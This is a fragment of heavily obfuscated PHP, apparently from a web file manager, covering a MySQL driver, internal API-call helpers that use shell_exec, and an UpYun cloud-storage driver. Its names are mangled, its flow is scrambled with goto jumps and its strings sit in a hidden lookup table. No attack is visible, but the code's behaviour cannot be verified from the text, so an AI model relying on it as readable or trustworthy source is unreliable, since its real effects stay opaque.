$this->connected = !0; if (1 != think_config($bµ¾¹Õ¾É¯[18])) { unset($this->config); } goto Dä¿Ğ›´÷; c¥”îˆÑâ: if (empty($dÇÈŒÖƒÒß)) { $dÇÈŒÖƒÒß = $this->config; } $this->linkID[$A¿‡ä‡³Òö] = new mysqli($dÇÈŒÖƒÒß[$bµ¾¹Õ¾É¯[820]], $dÇÈŒÖƒÒß[$bµ¾¹Õ¾É¯[822]], $dÇÈŒÖƒÒß[$bµ¾¹Õ¾É¯[823]], $dÇÈŒÖƒÒß[$bµ¾¹Õ¾É¯[17]], $dÇÈŒÖƒÒß[$bµ¾¹Õ¾É¯[821]] ? intval($dÇÈŒÖƒÒß[$bµ¾¹Õ¾É¯[821]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto EòŒ…ñÜÑÕ; Dä¿Ğ›´÷: } return $this->linkID[$A¿‡ä‡³Òö]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($e–ÓõÍ£¶ò) { goto BÄ¿¸‹‹š¾; e“Œß¤ÆÖÌ: $this->queryStr = $e–ÓõÍ£¶ò; if ($this->queryID) { $this->free(); } think_action_status($cµ‹¸¦ôŠÖ[19], 1); goto DèĞÏ¼Â°Õ; DèĞÏ¼Â°Õ: think_status($cµ‹¸¦ôŠÖ[20]); $this->queryID = $this->_linkID->query($e–ÓõÍ£¶ò); if ($this->_linkID->more_results()) { while (($cíÌëˆ‰ = $this->_linkID->next_result()) != NULL) { $cíÌëˆ‰->free_result(); } } goto AÊ ò†²ÉŒ; BÄ¿¸‹‹š¾: $cµ‹¸¦ôŠÖ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e“Œß¤ÆÖÌ; AÊ ò†²ÉŒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto E ÚÅ‹ÍÉ·; E ÚÅ‹ÍÉ·: } public function execute($bîà‘Œª‹) { goto eî¨ÛÕÑ‰Ğ; eî¨ÛÕÑ‰Ğ: $aÕÃïƒµ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fó»ÑÒªÇ; Fó»ÑÒªÇ: $this->queryStr = $bîà‘Œª‹; if ($this->queryID) { $this->free(); } think_action_status($aÕÃïƒµ[21], 1); goto AÏõÓœÆáŞ; AÏõÓœÆáŞ: think_status($aÕÃïƒµ[20]); $CîÈÈ¬Ö„ = $this->_linkID->query($bîà‘Œª‹); $this->debug(); goto Cìô†õÏ¯; Cìô†õÏ¯: if (!1 === $CîÈÈ¬Ö„) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto AÖ¸âõå•; AÖ¸âõå•: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bôç·å°¦¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Bôç·å°¦¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÂ“õˆœèÜ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fÂ“õˆœèÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $dêÑ™ßà„ = array(); if ($this->numRows > 0) { for ($aÅ¿†½Â×Î = 0; $aÅ¿†½Â×Î < $this->numRows; $aÅ¿†½Â×Î++) { $dêÑ™ßà„[$aÅ¿†½Â×Î] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dêÑ™ßà„; } public function getFields($D¼ÅÑö‘—°) { $f±…×“Áòõ =& $_SERVER[ã®Â„Éæ¹¤]; $Cğñ·Ô£Ãí = $this->query($f±…×“Áòõ[831] . $this->parseKey($D¼ÅÑö‘—°)); $A ííÇâîÈ = array(); if ($Cğñ·Ô£Ãí) { foreach ($Cğñ·Ô£Ãí as $bÙ‘ğŒ ï => $EèÜÕ§Û¡) { $A ííÇâîÈ[$EèÜÕ§Û¡[$f±…×“Áòõ[27]]] = array($f±…×“Áòõ[28] => $EèÜÕ§Û¡[$f±…×“Áòõ[27]], $f±…×“Áòõ[29] => $EèÜÕ§Û¡[$f±…×“Áòõ[30]], $f±…×“Áòõ[31] => (bool) ($EèÜÕ§Û¡[$f±…×“Áòõ[32]] === $f±…×“Áòõ[33]), $f±…×“Áòõ[34] => $EèÜÕ§Û¡[$f±…×“Áòõ[35]], $f±…×“Áòõ[36] => strtolower($EèÜÕ§Û¡[$f±…×“Áòõ[37]]) == $f±…×“Áòõ[38], $f±…×“Áòõ[39] => strtolower($EèÜÕ§Û¡[$f±…×“Áòõ[40]]) == $f±…×“Áòõ[41]); } } return $A ííÇâîÈ; } public function getTables($CöÌ—ÆïŠ = '') { $B–‚Ñ ¬º =& $_SERVER[ã®Â„Éæ¹¤]; $C—±õÔê¶Ó = !empty($CöÌ—ÆïŠ) ? $B–‚Ñ ¬º[833] . $CöÌ—ÆïŠ : $B–‚Ñ ¬º[834]; $fÕ¬óÃ³î‹ = $this->query($C—±õÔê¶Ó); $aóÖÌ· = array(); if ($fÕ¬óÃ³î‹) { foreach ($fÕ¬óÃ³î‹ as $F²¿ÙöÉ´ => $b«çÎ…÷) { $aóÖÌ·[$F²¿ÙöÉ´] = current($b«çÎ…÷); } } return $aóÖÌ·; } public function replace($fê²œ¢Ÿ—§, $bÜ½äÃ™ö© = array()) { $DšåªÌ«ĞÎ =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($fê²œ¢Ÿ—§ as $d¸¡›èò× => $aÒêİ‹‡’¡) { $eÔğ Ğ¢Å± = $this->parseValue($aÒêİ‹‡’¡); if (is_scalar($eÔğ Ğ¢Å±)) { $b­ŒøÏ‡õ¡[] = $eÔğ Ğ¢Å±; $f¤œÅºÂî©[] = $this->parseKey($d¸¡›èò×); } } $CÄˆ¶’ä¤º = $DšåªÌ«ĞÎ[835] . $this->parseTable($bÜ½äÃ™ö©[$DšåªÌ«ĞÎ[267]]) . $DšåªÌ«ĞÎ[836] . implode($DšåªÌ«ĞÎ[47], $f¤œÅºÂî©) . $DšåªÌ«ĞÎ[837] . implode($DšåªÌ«ĞÎ[47], $b­ŒøÏ‡õ¡) . $DšåªÌ«ĞÎ[838]; return $this->execute($CÄˆ¶’ä¤º); } public function insertAll($EÓ¿Âïº¯, $Cà„“±½Š = array(), $bá’Ë²Óí = false) { goto DçË‹å»íµ; DçË‹å»íµ: $E¢Ë—Éùºô =& $_SERVER[ã®Â„Éæ¹¤]; if (!is_array($EÓ¿Âïº¯[0])) { return !1; } $dÇº‰’¦Í» = array_keys($EÓ¿Âïº¯[0]); goto bğå¼â É’; cÇ«¬¯àíì: $a´õˆº¬ƒš = ($bá’Ë²Óí ? $E¢Ë—Éùºô[840] : $E¢Ë—Éùºô[841]) . $E¢Ë—Éùºô[842] . $this->parseTable($Cà„“±½Š[$E¢Ë—Éùºô[267]]) . $E¢Ë—Éùºô[836] . implode($E¢Ë—Éùºô[47], $dÇº‰’¦Í») . $E¢Ë—Éùºô[843] . implode($E¢Ë—Éùºô[47], $CË™Üä¼õ¹); return $this->execute($a´õˆº¬ƒš); goto C­«Í§Õ©š; bğå¼â É’: $CË™Üä¼õ¹ = array(); foreach ($EÓ¿Âïº¯ as $FùÚƒÌ¥™Ş) { $EŞÛĞâÓòÃ = array(); foreach ($FùÚƒÌ¥™Ş as $bË¹ßà£Å => $d‚ôˆ­ò‰) { $d‚ôˆ­ò‰ = $this->parseValue($d‚ôˆ­ò‰); if (is_scalar($d‚ôˆ­ò‰)) { $EŞÛĞâÓòÃ[] = $d‚ôˆ­ò‰; } } $CË™Üä¼õ¹[] = $E¢Ë—Éùºô[248] . implode($E¢Ë—Éùºô[47], $EŞÛĞâÓòÃ) . $E¢Ë—Éùºô[838]; } array_walk($dÇº‰’¦Í», array($this, $E¢Ë—Éùºô[839])); goto cÇ«¬¯àíì; C­«Í§Õ©š: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÆÁà†‚ùÄ =& $_SERVER[ã®Â„Éæ¹¤]; $this->error = $this->_linkID->errno . $dÆÁà†‚ùÄ[4] . $this->_linkID->error; if ($dÆÁà†‚ùÄ[33] != $this->queryStr) { $this->error .= LNG($dÆÁà†‚ùÄ[45]) . $this->queryStr; } think_trace($this->error, $dÆÁà†‚ùÄ[33], $dÆÁà†‚ùÄ[46]); return $this->error; } public function escapeString($d¿»±Ûƒ°Œ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($d¿»±Ûƒ°Œ); } else { return addslashes($d¿»±Ûƒ°Œ); } } public function parseKey(&$bñƒéå˜Í—, $FÆ„ó«ÙÈë = true) { $C¦ƒ¥¬ö³Ğ =& $_SERVER[ã®Â„Éæ¹¤]; if ($FÆ„ó«ÙÈë) { $bñƒéå˜Í— = $this->parseKeyCheck($bñƒéå˜Í—); } if ($bñƒéå˜Í— != $C¦ƒ¥¬ö³Ğ[176] && !preg_match($C¦ƒ¥¬ö³Ğ[844], $bñƒéå˜Í—)) { $bñƒéå˜Í— = $C¦ƒ¥¬ö³Ğ[845] . trim($bñƒéå˜Í—, $C¦ƒ¥¬ö³Ğ[845]) . $C¦ƒ¥¬ö³Ğ[845]; } return $bñƒéå˜Í—; } } goto CÕ½Û½æŒÉ; c±¹àœã¸†: function ActionCall($eÑ‡¢¬¤•) { $e±™çñíàš = array_slice(func_get_args(), 1); return ActionApply($eÑ‡¢¬¤•, $e±™çñíàš); } function ActionCallApi($cµ² Éì“¢, $D¸·‹´îå = '') { goto F“¬›­‰ÈÕ; F“¬›­‰ÈÕ: $D¸µÜÇ¨Â‘ =& $_SERVER[ˆó©™¯í›]; $d¬ƒÖîÁ¶‘ = $D¸·‹´îå; if (is_array($D¸·‹´îå)) { $d¬ƒÖîÁ¶‘ = $D¸µÜÇ¨Â‘[16]; foreach ($D¸·‹´îå as $EÛÔöÒ£øò => $e»óêáô†©) { $e»óêáô†© = is_array($e»óêáô†©) ? json_encode($e»óêáô†©) : $e»óêáô†©; $e»óêáô†© = is_bool($e»óêáô†©) ? intval($e»óêáô†©) : $e»óêáô†©; $d¬ƒÖîÁ¶‘ .= $D¸µÜÇ¨Â‘[17] . $EÛÔöÒ£øò . $D¸µÜÇ¨Â‘[18] . rawurlencode($e»óêáô†©); } } goto c¦“¾•œ–‘; a£…÷¼ŞÓ“: $dÁ–È¦½½ = json_decode($bğ°ó–¸†Ç, !0); $DÅîÁ¥¡ÇÂ = is_array($dÁ–È¦½½) ? $dÁ–È¦½½ : array($D¸µÜÇ¨Â‘[29] => null, $D¸µÜÇ¨Â‘[30] => $bğ°ó–¸†Ç); if (!$dÁ–È¦½½) { echo $bğ°ó–¸†Ç; } goto aÍÚê»ö»®; Dğ´ÈŸçÅ›: $f¥„è›†¤ = phpBinCommand(); if ($f¥„è›†¤ && function_exists($D¸µÜÇ¨Â‘[21])) { $DÙè±½İ· = $f¥„è›†¤ . $D¸µÜÇ¨Â‘[22] . BASIC_PATH . $D¸µÜÇ¨Â‘[23] . escapeshellarg($cµ² Éì“¢); $bğ°ó–¸†Ç = shell_exec($DÙè±½İ·); } if (!$bğ°ó–¸†Ç) { $D‚±õÛÆÌ = stream_context_create(array($D¸µÜÇ¨Â‘[24] => array($D¸µÜÇ¨Â‘[25] => 20, $D¸µÜÇ¨Â‘[26] => $D¸µÜÇ¨Â‘[27]))); $bğ°ó–¸†Ç = file_get_contents(APP_HOST . $D¸µÜÇ¨Â‘[28] . $cµ² Éì“¢, !1, $D‚±õÛÆÌ); } goto a£…÷¼ŞÓ“; aÍÚê»ö»®: return $DÅîÁ¥¡ÇÂ; goto b˜‹«­…ª˜; c¦“¾•œ–‘: $F•®¬èĞ½Ã = Action($D¸µÜÇ¨Â‘[19])->accessToken(); $cµ² Éì“¢ = str_replace($D¸µÜÇ¨Â‘[5], $D¸µÜÇ¨Â‘[4], $cµ² Éì“¢) . $D¸µÜÇ¨Â‘[20] . $F•®¬èĞ½Ã . $d¬ƒÖîÁ¶‘; $bğ°ó–¸†Ç = $D¸µÜÇ¨Â‘[16]; goto Dğ´ÈŸçÅ›; b˜‹«­…ª˜: } function ActionCallHook($C‘ÁÇ‘›Ê) { goto EùÕ«²×Éœ; EùÕ«²×Éœ: $F°ËŠäô´ =& $_SERVER[ˆó©™¯í›]; ob_start(); $aèôªœãÆ = array_slice(func_get_args(), 1); goto A˜æ Á†ñÇ; Eè…‘ƒÓ˜ï: $eëÌ ‡Œ… = $b‘¸ŠÍ²£ ? json_decode($b‘¸ŠÍ²£, !0) : $eëÌ ‡Œ…; $GLOBALS[$F°ËŠäô´[31]] = 0; return $eëÌ ‡Œ…; goto Dß“Öë˜ĞÌ; A˜æ Á†ñÇ: $GLOBALS[$F°ËŠäô´[31]] = 1; $eëÌ ‡Œ… = ActionApply($C‘ÁÇ‘›Ê, $aèôªœãÆ); $b‘¸ŠÍ²£ = ob_get_clean(); goto Eè…‘ƒÓ˜ï; Dß“Öë˜ĞÌ: } goto c¦óù¦ÕÕ‚; fÓš™‹¼: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\72\x2f\57\x76\60\x2e\141\x70\x69\56\x75\160\171\165\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($B¬ƒŒ—‹³È) { parent::__construct(); $this->_init($B¬ƒŒ—‹³È); } public function _init($AµğŸªøØ„) { foreach ($AµğŸªøØ„ as $a—õŸÍ¾’¹ => $fÂâšÚ£œ) { if (isset($this->{$a—õŸÍ¾’¹})) { $this->{$a—õŸÍ¾’¹} = $fÂâšÚ£œ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[ã®Â„Éæ¹¤][1260], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($dôİ¦ù‰Ø, $EÈç‚Ûä— = "\x47\105\124") { $a°æ©Æ¤ø¶ =& $_SERVER[ã®Â„Éæ¹¤]; $dÃáÚÒ„î = gmdate($a°æ©Æ¤ø¶[1223]); $b¨Ú§÷ÙñŒ = base64_encode(hash_hmac($a°æ©Æ¤ø¶[1261], "{$EÈç‚Ûä—}\x26{$dôİ¦ù‰Ø}\46{$dÃáÚÒ„î}", md5("{$this->userpass}"), !0)); $d›‰†™ó™ğ = array("\101\x75\x74\x68\x6f\162\x69\172\x61\x74\151\x6f\156\72\125\120\131\x55\116\x20{$this->username}\72{$b¨Ú§÷ÙñŒ}", "\104\x61\164\145\72{$dÃáÚÒ„î}"); return $d›‰†™ó™ğ; } public function ussRequest($Cˆ†á˜¸£ù, $cæïô²Èë = "\107\x45\124", $cÂ”ŒÊÄÄ = false, $D±Æ’Éä = false, $A„Û‰Å˜ÛŒ = false) { goto FàåÓ ëÌÅ; DÕÀ‡¾“õ: $d›ŸÏ†Ë²¤ = $this->ussHeaders($BË‡ËÇÇ®, $cæïô²Èë); if ($D±Æ’Éä) { $d›ŸÏ†Ë²¤ = array_merge($d›ŸÏ†Ë²¤, $D±Æ’Éä); } $aªî”§Ì„² = url_request($this->endpoint . $BË‡ËÇÇ®, $cæïô²Èë, $cÂ”ŒÊÄÄ, $d›ŸÏ†Ë²¤, $A„Û‰Å˜ÛŒ); goto BáöäáÇ; FàåÓ ëÌÅ: $eÊÍÏÉå‚ã =& $_SERVER[ã®Â„Éæ¹¤]; $Cˆ†á˜¸£ù = trim($Cˆ†á˜¸£ù, $eÊÍÏÉå‚ã[8]); $BË‡ËÇÇ® = "\x2f{$this->bucket}\x2f{$Cˆ†á˜¸£ù}"; goto DÕÀ‡¾“õ; BáöäáÇ: if (!$aªî”§Ì„²) { return array($eÊÍÏÉå‚ã[1051] => !1, $eÊÍÏÉå‚ã[1053] => $eÊÍÏÉå‚ã[1262]); } if (strtolower($cæïô²Èë) == $eÊÍÏÉå‚ã[184] || in_array($aªî”§Ì„²[$eÊÍÏÉå‚ã[1051]], array($eÊÍÏÉå‚ã[1119], $eÊÍÏÉå‚ã[1263]))) { $cÂ”ŒÊÄÄ = $aªî”§Ì„²[$eÊÍÏÉå‚ã[1264]]; } else { $cÂ”ŒÊÄÄ = json_decode($aªî”§Ì„²[$eÊÍÏÉå‚ã[1053]], !0); if (!$cÂ”ŒÊÄÄ) { $cÂ”ŒÊÄÄ = $aªî”§Ì„²[$eÊÍÏÉå‚ã[1053]]; } else { if (!$aªî”§Ì„²[$eÊÍÏÉå‚ã[711]] && isset($cÂ”ŒÊÄÄ[$eÊÍÏÉå‚ã[1265]])) { $cÂ”ŒÊÄÄ = $cÂ”ŒÊÄÄ[$eÊÍÏÉå‚ã[1265]]; } } } return array($eÊÍÏÉå‚ã[1051] => $aªî”§Ì„²[$eÊÍÏÉå‚ã[711]], $eÊÍÏÉå‚ã[1053] => $cÂ”ŒÊÄÄ); goto F“£»»÷Ö„; F“£»»÷Ö„: } public function mkfile($CÆ¼†¶¥‚, $a÷×ÖšÅ® = '', $d“¢Íç·­ = REPEAT_RENAME) { if ($this->setContent($CÆ¼†¶¥‚, $a÷×ÖšÅ®)) { return $this->getPathOuter($CÆ¼†¶¥‚); } return !1; } public function mkdir($FÂ¡‹ùÙ¶Ÿ, $BçÎ¸‘ù¾ = REPEAT_SKIP) { $fì…Ç±Ü·Ã =& $_SERVER[ã®Â„Éæ¹¤]; $Dµë–ƒ§ = trim($FÂ¡‹ùÙ¶Ÿ, $fì…Ç±Ü·Ã[8]); if ($this->_isFolder($Dµë–ƒ§)) { return $this->getPathOuter($Dµë–ƒ§); } $CÄŞÕº¥² = array($fì…Ç±Ü·Ã[1266]); $dß‹Ãï…¿ = $this->ussRequest($Dµë–ƒ§, $fì…Ç±Ü·Ã[212], !1, $CÄŞÕº¥²); return $dß‹Ãï…¿[$fì…Ç±Ü·Ã[1051]] ? $this->getPathOuter($Dµë–ƒ§) : !1; } public function copyFile($F‚òíƒ“Å—, $A¬±¢›Æ¬œ) { $dƒîë³Õ¡š =& $_SERVER[ã®Â„Éæ¹¤]; $Aõ¹×—¡Ñ = array($dƒîë³Õ¡š[1267] . "\57{$this->bucket}\x2f{$F‚òíƒ“Å—}", $dƒîë³Õ¡š[1268]); $b‡ÂëŞßé  = $this->ussRequest($A¬±¢›Æ¬œ, $dƒîë³Õ¡š[214], !1, $Aõ¹×—¡Ñ); return $b‡ÂëŞßé [$dƒîë³Õ¡š[1051]] ? !0 : $this->getPathOuter($A¬±¢›Æ¬œ); } public function moveFile($dÂ…Ó›¬»Ò, $E¨¦Ì’ãª¥) { $fœˆã‚•Å¬ =& $_SERVER[ã®Â„Éæ¹¤]; $B±ÉÖì±æä = array($fœˆã‚•Å¬[1269] . "\57{$this->bucket}\57{$dÂ…Ó›¬»Ò}", $fœˆã‚•Å¬[1268]); $dò­‘à¸Ğí = $this->ussRequest($E¨¦Ì’ãª¥, $fœˆã‚•Å¬[214], !1, $B±ÉÖì±æä); return $dò­‘à¸Ğí[$fœˆã‚•Å¬[1051]] ? !0 : $this->getPathOuter($E¨¦Ì’ãª¥); } public function delFile($eàäë„—¼¹) { $BÈà—²Ç¯‡ =& $_SERVER[ã®Â„Éæ¹¤]; $aóÜˆ£Ê¤¡ = $this->ussRequest($eàäë„—¼¹, $BÈà—²Ç¯‡[1270]); return $aóÜˆ£Ê¤¡[$BÈà—²Ç¯‡[1051]] ? !0 : !1; } public function delFolder($AÕÁ¦µ¿) { $dõ‡‚Ëíá‹ =& $_SERVER[ã®Â„Éæ¹¤]; $e°ˆ ÚÈ„Ø = $this->listAll($AÕÁ¦µ¿); krsort($e°ˆ ÚÈ„Ø); foreach ($e°ˆ ÚÈ„Ø as $fƒÕåƒùˆ) { $this->ussRequest($fƒÕåƒùˆ[$dõ‡‚Ëíá‹[75]], $dõ‡‚Ëíá‹[1270]); } return $this->ussRequest($AÕÁ¦µ¿, $dõ‡‚Ëíá‹[1270]); } public function rename($c‚ìõ¡, $fğ–ù²ê•) { if ($this->isFile($c‚ìõ¡)) { $fğ–ù²ê• = get_path_father($c‚ìõ¡) . $fğ–ù²ê•; return $this->moveFile($c‚ìõ¡, $fğ–ù²ê•); } return $this->renameObject($c‚ìõ¡, $fğ–ù²ê•); } public function fileInfo($CåŠ÷¨ğ², $BºÓ¸¢“Ù‹ = false, $b‰ğíâäó® = array()) { $cÄëìî¢¿Â =& $_SERVER[ã®Â„Éæ¹¤]; if ($BºÓ¸¢“Ù‹) { return array($cÄëìî¢¿Â[28] => $this->pathThis($CåŠ÷¨ğ²), $cÄëìî¢¿Â[75] => $this->getPathOuter($cÄëìî¢¿Â[8] . $CåŠ÷¨ğ²), $cÄëìî¢¿Â[29] => $cÄëìî¢¿Â[167], $cÄëìî¢¿Â[77] => isset($b‰ğíâäó®[$cÄëìî¢¿Â[325]]) ? $b‰ğíâäó®[$cÄëìî¢¿Â[325]] : 0, $cÄëìî¢¿Â[160] => $this->ext($CåŠ÷¨ğ²)); } $C×Äã‚Æ£ = array($cÄëìî¢¿Â[28] => $this->pathThis($CåŠ÷¨ğ²), $cÄëìî¢¿Â[75] => $this->getPathOuter($cÄëìî¢¿Â[8] . $CåŠ÷¨ğ²), $cÄëìî¢¿Â[29] => $cÄëìî¢¿Â[167], $cÄëìî¢¿Â[187] => 0, $cÄëìî¢¿Â[107] => isset($eÄ¹Ó»â£[$cÄëìî¢¿Â[1271]]) ? $eÄ¹Ó»â£[$cÄëìî¢¿Â[1271]] : 0, $cÄëìî¢¿Â[77] => isset($b‰ğíâäó®[$cÄëìî¢¿Â[325]]) ? $b‰ğíâäó®[$cÄëìî¢¿Â[325]] : 0, $cÄëìî¢¿Â[160] => $this->ext($CåŠ÷¨ğ²), $cÄëìî¢¿Â[188] => !0, $cÄëìî¢¿Â[189] => !0); if (empty($b‰ğíâäó®)) { $b‰ğíâäó® = $this->objectMeta($CåŠ÷¨ğ²); if (!$b‰ğíâäó®) { return $C×Äã‚Æ£; } $C×Äã‚Æ£[$cÄëìî¢¿Â[187]] = $b‰ğíâäó®[$cÄëìî¢¿Â[1272]]; $C×Äã‚Æ£[$cÄëìî¢¿Â[107]] = $b‰ğíâäó®[$cÄëìî¢¿Â[1273]]; $C×Äã‚Æ£[$cÄëìî¢¿Â[77]] = $b‰ğíâäó®[$cÄëìî¢¿Â[77]]; } return $C×Äã‚Æ£; } public function folderInfo($E¥“Úæ¼ôô, $a„Éê—¸ƒ = false) { $E¦²éåšš =& $_SERVER[ã®Â„Éæ¹¤]; if ($a„Éê—¸ƒ) { return array($E¦²éåšš[28] => $this->pathThis($E¥“Úæ¼ôô), $E¦²éåšš[75] => $this->getPathOuter($E¦²éåšš[8] . $E¥“Úæ¼ôô), $E¦²éåšš[29] => $E¦²éåšš[76]); } $a—ø£Àô™Ó = array($E¦²éåšš[28] => $this->pathThis($E¥“Úæ¼ôô), $E¦²éåšš[75] => $this->getPathOuter($E¦²éåšš[8] . $E¥“Úæ¼ôô), $E¦²éåšš[29] => $E¦²éåšš[76], $E¦²éåšš[187] => 0, $E¦²éåšš[107] => isset($AÙÕ„¯Óß„[$E¦²éåšš[1271]]) ? $AÙÕ„¯Óß„[$E¦²éåšš[1271]] : 0, $E¦²éåšš[1181] => !0, $E¦²éåšš[1182] => !0); if (empty($aÅ‘À†‡àß)) { $aÅ‘À†‡àß = $this->objectMeta($E¥“Úæ¼ôô); if (!$aÅ‘À†‡àß) { return $a—ø£Àô™Ó; } $a—ø£Àô™Ó[$E¦²éåšš[187]] = $aÅ‘À†‡àß[$E¦²éåšš[1272]]; $a—ø£Àô™Ó[$E¦²éåšš[107]] = $aÅ‘À†‡àß[$E¦²éåšš[1273]]; } return $a—ø£Àô™Ó; } private function fileList($c™Îà¿œÒÁ, $Fà´­ò—Ò = 0, $B¢ì“ÛãÔ’ = 1000) { $D·ƒë°•åµ =& $_SERVER[ã®Â„Éæ¹¤]; $d¤ˆù‚º = array($D·ƒë°•åµ[1274], $D·ƒë°•åµ[1275] . $B¢ì“ÛãÔ’); if ($Fà´­ò—Ò) { $d¤ˆù‚º[] = $D·ƒë°•åµ[1276] . $Fà´­ò—Ò; } $c®éÉ ¯¶ô = $this->ussRequest($c™Îà¿œÒÁ, $D·ƒë°•åµ[216], !1, $d¤ˆù‚º); return !$c®éÉ ¯¶ô[$D·ƒë°•åµ[1051]] ? !1 : $c®éÉ ¯¶ô[$D·ƒë°•åµ[1053]]; } public function listPath($Fğ‡ÚÖ¡Ò¨, $eèÎ¼„Ÿ¶ = false) { goto C‰¸åÌ“›²; Eù‹í…¦³: $a›¥Çæí = $d¢ƒ¯Ïùö´ = array(); $dÅÓä«„× = rtrim($Fğ‡ÚÖ¡Ò¨, $C›ÍÉÜ”é¤[8]) . $C›ÍÉÜ”é¤[8]; while (!0) { $Bì‘Œ¼ôøè = $this->fileList($Fğ‡ÚÖ¡Ò¨, $bÉİÜ²…¶·, $BÙì•Š…›Š); if (!$Bì‘Œ¼ôøè) { return !1; } $bÉİÜ²…¶· = isset($Bì‘Œ¼ôøè[$C›ÍÉÜ”é¤[1277]]) ? $Bì‘Œ¼ôøè[$C›ÍÉÜ”é¤[1277]] : $C›ÍÉÜ”é¤[33]; $f©œï‚Ø«— = isset($Bì‘Œ¼ôøè[$C›ÍÉÜ”é¤[1278]]) ? $Bì‘Œ¼ôøè[$C›ÍÉÜ”é¤[1278]] : array(); foreach ($f©œï‚Ø«— as $C—¤›‡Æ©²) { if ($C—¤›‡Æ©²[$C›ÍÉÜ”é¤[29]] == $C›ÍÉÜ”é¤[76]) { $a›¥Çæí[] = $this->folderInfo($dÅÓä«„× . $C—¤›‡Æ©²[$C›ÍÉÜ”é¤[28]], $eèÎ¼„Ÿ¶, $C—¤›‡Æ©²); } else { $d¢ƒ¯Ïùö´[] = $this->fileInfo($dÅÓä«„× . $C—¤›‡Æ©²[$C›ÍÉÜ”é¤[28]], $eèÎ¼„Ÿ¶, $C—¤›‡Æ©²); } } if (count($f©œï‚Ø«—) < $BÙì•Š…›Š) { break; } } goto eğÜ”¹‹Â; eğÜ”¹‹Â: return array($C›ÍÉÜ”é¤[74] => $a›¥Çæí, $C›ÍÉÜ”é¤[73] => $d¢ƒ¯Ïùö´); goto Cğ²ÕÄ›‹ ; C‰¸åÌ“›²: $C›ÍÉÜ”é¤ =& $_SERVER[ã®Â„Éæ¹¤]; $bÉİÜ²…¶· = $C›ÍÉÜ”é¤[33]; $BÙì•Š…›Š = 1000; goto Eù‹í…¦³; Cğ²ÕÄ›‹ : } private function recursionAllFiles($B®‘ŸŞãÁ, &$D¾ë¿®Ì±) { $aöŠÂØàÂ =& $_SERVER[ã®Â„Éæ¹¤]; $C†»§Şá®œ = $aöŠÂØàÂ[33]; $dóîŸÍ´»¯ = 1000; $aˆÌóãØ‡‹ = $C¨÷¯Øô˜÷ = array(); $C™§æ¼¢¡ = rtrim($B®‘ŸŞãÁ, $aöŠÂØàÂ[8]) . $aöŠÂØàÂ[8]; while (!0) { $e‚Ñè©ˆ“ô = $this->fileList($B®‘ŸŞãÁ, $C†»§Şá®œ, $dóîŸÍ´»¯); if (!$e‚Ñè©ˆ“ô) { return !1; } $C†»§Şá®œ = isset($e‚Ñè©ˆ“ô[$aöŠÂØàÂ[1277]]) ? $e‚Ñè©ˆ“ô[$aöŠÂØàÂ[1277]] : $aöŠÂØàÂ[33]; $EÇõìÊ‡® = isset($e‚Ñè©ˆ“ô[$aöŠÂØàÂ[1278]]) ? $e‚Ñè©ˆ“ô[$aöŠÂØàÂ[1278]] : array(); foreach ($EÇõìÊ‡® as $f¶‡ƒ‡®¥ö) { $C³Ó—´ƒÑ„ = array($aöŠÂØàÂ[75] => $C™§æ¼¢¡ . $f¶‡ƒ‡®¥ö[$aöŠÂØàÂ[28]], $aöŠÂØàÂ[76] => $f¶‡ƒ‡®¥ö[$aöŠÂØàÂ[29]] == $aöŠÂØàÂ[76] ? 1 : 0, $aöŠÂØàÂ[77] => isset($f¶‡ƒ‡®¥ö[$aöŠÂØàÂ[325]]) ? $f¶‡ƒ‡®¥ö[$aöŠÂØàÂ[325]] : 0); $D¾ë¿®Ì±[] = $C³Ó—´ƒÑ„; if ($C³Ó—´ƒÑ„[$aöŠÂØàÂ[76]] == 1) { $this->recursionAllFiles($C³Ó—´ƒÑ„[$aöŠÂØàÂ[75]], $D¾ë¿®Ì±); } } if (count($EÇõìÊ‡®) < $dóîŸÍ´»¯) { break; } } } public function has($aÃÈ†õ¶ĞŠ, $f¢êç«¨ß = false, $cĞ—™ÔÁ Æ = true) { goto bô©Ô‹¦œ; bô©Ô‹¦œ: $CìÑœŸí£¯ =& $_SERVER[ã®Â„Éæ¹¤]; $a¤‰¡óÎ™ = $CìÑœŸí£¯[33]; $f¼Ú±šãö = 1000; goto f„÷£öÃ“î; bì’ô›„†: while (!0) { $B¶„¿á¬‰  = $this->fileList($aÃÈ†õ¶ĞŠ, $a¤‰¡óÎ™, $f¼Ú±šãö); if (!$B¶„¿á¬‰ ) { return !1; } $a¤‰¡óÎ™ = isset($B¶„¿á¬‰ [$CìÑœŸí£¯[1277]]) ? $B¶„¿á¬‰ [$CìÑœŸí£¯[1277]] : $CìÑœŸí£¯[33]; $D™‰˜®é¤Ó = isset($B¶„¿á¬‰ [$CìÑœŸí£¯[1278]]) ? $B¶„¿á¬‰ [$CìÑœŸí£¯[1278]] : array(); if (empty($D™‰˜®é¤Ó)) { break; } 